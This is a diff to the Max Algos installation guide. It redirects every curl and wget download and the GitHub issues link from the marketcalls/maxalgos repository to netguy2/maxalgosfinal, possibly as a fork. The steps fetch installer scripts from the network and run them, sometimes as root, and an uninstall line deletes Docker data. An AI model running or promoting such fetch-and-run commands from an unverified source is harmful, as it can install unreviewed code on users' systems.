@@ -19,13 +19,13 @@ For **personal trading** on your desktop/laptop with Docker Desktop.
 
 #### Windows (PowerShell or Command Prompt)
 ```powershell
-curl.exe -O https://raw.githubusercontent.com/marketcalls/maxalgos/main/install/docker-run.bat
+curl.exe -O https://raw.githubusercontent.com/netguy2/maxalgosfinal/main/install/docker-run.bat
 docker-run.bat
 ```
 
 #### macOS / Linux (Terminal)
 ```bash
-curl -O https://raw.githubusercontent.com/marketcalls/maxalgos/main/install/docker-run.sh
+curl -O https://raw.githubusercontent.com/netguy2/maxalgosfinal/main/install/docker-run.sh
 chmod +x docker-run.sh
 ./docker-run.sh
 ```
@@ -138,7 +138,7 @@ This script provides a simplified, automated installation of Max Algos using Doc
 ### One-Line Installation
 
 ```bash
-wget https://raw.githubusercontent.com/marketcalls/maxalgos/refs/heads/main/install/install-docker.sh && chmod +x install-docker.sh && ./install-docker.sh
+wget https://raw.githubusercontent.com/netguy2/maxalgosfinal/refs/heads/main/install/install-docker.sh && chmod +x install-docker.sh && ./install-docker.sh
 ```
 
 ### Prerequisites
@@ -159,7 +159,7 @@ usermod -aG sudo maxalgos
 su - maxalgos
 
 # Download and run the script
-wget https://raw.githubusercontent.com/marketcalls/maxalgos/refs/heads/main/install/install-docker.sh
+wget https://raw.githubusercontent.com/netguy2/maxalgosfinal/refs/heads/main/install/install-docker.sh
 chmod +x install-docker.sh
 ./install-docker.sh
 ```
@@ -168,7 +168,7 @@ chmod +x install-docker.sh
 
 ```bash
 # Download and run directly
-wget https://raw.githubusercontent.com/marketcalls/maxalgos/refs/heads/main/install/install-docker.sh
+wget https://raw.githubusercontent.com/netguy2/maxalgosfinal/refs/heads/main/install/install-docker.sh
 chmod +x install-docker.sh
 ./install-docker.sh
 # (Confirm when prompted to proceed as root)
@@ -485,7 +485,7 @@ sudo rm -rf /var/lib/docker
 
 - **Documentation**: https://docs.maxalgos.in
 - **Discord Community**: https://discord.com/invite/UPh7QPsNhP
-- **GitHub Issues**: https://github.com/marketcalls/maxalgos/issues
+- **GitHub Issues**: https://github.com/netguy2/maxalgosfinal/issues
 - **YouTube Tutorials**: https://youtube.com/@maxalgosHQ
 - **Website**: https://maxalgos.in
 
